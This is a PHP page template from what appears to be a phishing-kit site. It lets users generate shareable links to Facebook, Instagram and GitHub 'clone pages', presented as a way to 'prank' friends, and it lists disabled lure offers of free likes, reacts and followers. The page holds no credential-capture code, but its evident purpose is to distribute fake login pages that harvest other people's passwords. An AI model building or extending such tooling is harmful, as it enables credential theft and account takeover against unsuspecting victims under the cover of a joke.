<?php
    include_once('header.php');
    if(isset($_SESSION['login'])){
    include_once('redirect.php');
    }
 ?>
    <h3 class="text-center">Click on generate and copy the clone page, Prank with your friends  &#129488  </h3>
    <small class="px-2 text-muted text-center"> if You dont knew what should you do ?  <a href="toutrial.php#toutrialStart" target="blank"> Learn Toutrial </a> </small>
    <table class="table table-danger border">
        <thead>
            <tr>
                <th scope="col">#</th>
                <th scope="col">Page Name</th>
                <th scope="col" class="text-center">Action</th>
            </tr>
        </thead>
    <tbody>
        <tr>
            <th scope="row">1</th>
            <td> Facebook clone page </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <?php if(isset($fbpageLink)){ 
                        echo '<input type="button" name="copy" value="Copy Link" data-page-link="'.$fbpageLink.'" class="btn btn-primary " onclick="copyBtn(this)">
                        <a href="'.$fbpageLink.'" target="blank"> <input type="button"  value="View Page" class="btn btn-success"></a>';
                    }else {
                        echo '<input type="submit" name="facebook" value="Generate link" class="btn btn-primary fbGenerate">';
                    } 
                    ?>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Instagram clone page </td>
            <td class="text-center"> 
            <form action="" method="post">
                    <?php if(isset($instapageLink)){ 
                        echo '<input type="button" name="copy" value="Copy Link" data-page-link="'.$instapageLink.'" class="btn btn-primary " onclick="copyBtn(this)">
                        <a href="'.$instapageLink.'" target="blank"> <input type="button"  value="View Page" class="btn btn-success"></a>';
                    }else {
                        echo '<input type="submit" name="instagram" value="Generate link" class="btn btn-danger">';
                    } 
                    ?>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Github clone page </td>
            <td class="text-center"> 
            <form action="" method="post">
                    <?php if(isset($gitpageLink)){ 
                        echo '<input type="button" name="copy" value="Copy Link" data-page-link="'.$gitpageLink.'" class="btn btn-primary " onclick="copyBtn(this)">
                        <a href="'.$gitpageLink.'" target="blank"> <input type="button"  value="View Page" class="btn btn-success"></a>';
                    }else {
                        echo '<input type="submit" name="github" value="Generate link" class="btn btn-dark">';
                    } 
                    ?>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Get 1000 like one click on facebook page </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbpageLike" value="Generate link" class="btn btn-warning disabled">
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Get 10000 react on facebook profile </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbprofileReact" value="Generate link" class="btn btn-warning" disabled>
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Instagram one click Get 1000 followers </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbprofileReact" value="Generate link" class="btn btn-warning" disabled>
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td class="position-relative"> Get 10000 react on facebook profile 
            </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbprofileReact" value="Generate link" class="btn btn-warning" disabled>
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
    </tbody>
    </table>
<?php
 include('footer.php');
?>
      